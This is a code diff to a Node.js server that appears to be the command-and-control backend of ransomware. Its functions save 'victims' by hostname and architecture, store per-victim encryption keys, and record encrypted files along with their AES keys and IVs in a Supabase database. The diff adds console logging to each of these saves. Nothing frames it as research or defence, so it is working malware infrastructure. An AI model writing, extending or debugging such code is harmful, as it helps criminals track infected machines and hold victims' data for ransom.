@@ -16,6 +16,13 @@ const supabase = process.env.SUPABASE_URL && process.env.SUPABASE_KEY
   ? createClient(process.env.SUPABASE_URL, process.env.SUPABASE_KEY)
   : null;
 
+// Log Supabase connection status at startup
+if (supabase) {
+  console.log('[Supabase] Connected to:', process.env.SUPABASE_URL);
+} else {
+  console.log('[Supabase] NOT CONFIGURED - Set SUPABASE_URL and SUPABASE_KEY in environment');
+}
+
 // Global RL interface
 global.rl = null;
 
@@ -70,7 +77,11 @@ if (!fs.existsSync(KEYS_DIR)) {
 
 // Save victim to database
 async function saveVictim(data) {
-  if (!supabase) return;
+  if (!supabase) {
+    console.log('[Supabase] saveVictim skipped - no client');
+    return;
+  }
+  console.log('[Supabase] Saving victim:', data.uuid, data.hostname);
   try {
     const { error } = await supabase.from('victims').upsert({
       uuid: data.uuid,
@@ -82,7 +93,11 @@ async function saveVictim(data) {
       arch: data.arch,
       status: data.status || 'connected'
     }, { onConflict: 'uuid' });
-    if (error) console.log(`[DB Error] victims: ${error.message}`);
+    if (error) {
+      console.log(`[DB Error] victims: ${error.message}`);
+    } else {
+      console.log('[Supabase] Victim saved successfully:', data.hostname);
+    }
   } catch (e) {
     console.log(`[DB Failed] victims: ${e.message}`);
   }
@@ -90,7 +105,11 @@ async function saveVictim(data) {
 
 // Save encryption key to database
 async function saveKey(data) {
-  if (!supabase) return;
+  if (!supabase) {
+    console.log('[Supabase] saveKey skipped - no client');
+    return;
+  }
+  console.log('[Supabase] Saving key for:', data.hostname);
   try {
     const { error } = await supabase.from('keys').insert({
       uuid: data.uuid,
@@ -100,6 +119,8 @@ async function saveKey(data) {
     });
     if (error && !error.message.includes('duplicate')) {
       console.log(`[DB Error] keys: ${error.message}`);
+    } else {
+      console.log('[Supabase] Key saved successfully');
     }
   } catch (e) {
     console.log(`[DB Failed] keys: ${e.message}`);
@@ -108,7 +129,11 @@ async function saveKey(data) {
 
 // Save encrypted file to database
 async function saveEncryptedFile(data) {
-  if (!supabase) return;
+  if (!supabase) {
+    console.log('[Supabase] saveEncryptedFile skipped - no client');
+    return;
+  }
+  console.log('[Supabase] Saving encrypted file:', data.archivo);
   try {
     const { error } = await supabase.from('encrypted_files').insert({
       uuid: data.uuid,
@@ -119,7 +144,11 @@ async function saveEncryptedFile(data) {
       iv: data.iv,
       aes_key: data.aesKey
     });
-    if (error) console.log(`[DB Error] encrypted: ${error.message}`);
+    if (error) {
+      console.log(`[DB Error] encrypted: ${error.message}`);
+    } else {
+      console.log('[Supabase] Encrypted file saved successfully');
+    }
   } catch (e) {
     console.log(`[DB Failed] encrypted: ${e.message}`);
   }
